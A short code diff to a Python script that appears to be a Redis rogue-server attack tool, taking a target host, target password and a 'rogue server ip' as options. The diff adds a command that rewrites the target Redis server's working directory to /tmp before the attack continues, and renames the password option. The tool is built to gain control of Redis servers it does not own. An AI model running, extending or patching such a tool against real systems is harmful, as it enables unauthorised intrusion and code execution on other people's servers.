@@ -147,6 +147,8 @@ def runserver(rhost, rport, passwd, lhost, lport, bind_addr, server_only):
 
     # read original config
     dbfilename = remote.do("CONFIG GET dbfilename").split(CLRF)[-2]
+    
+    remote.do("CONFIG SET dir /tmp")
     dbdir = remote.do("CONFIG GET dir").split(CLRF)[-2]
 
     # modified to eval config
@@ -179,7 +181,7 @@ if __name__ == '__main__':
             help="target host")
     parser.add_option("--rport", dest="rp", type="int",
             help="target redis port, default 6379", default=6379)
-    parser.add_option("--passwd", dest="rpasswd", type="string",
+    parser.add_option("--rpasswd", dest="rpasswd", type="string",
             help="target redis password")
     parser.add_option("--lhost", dest="lh", type="string",
             help="rogue server ip")
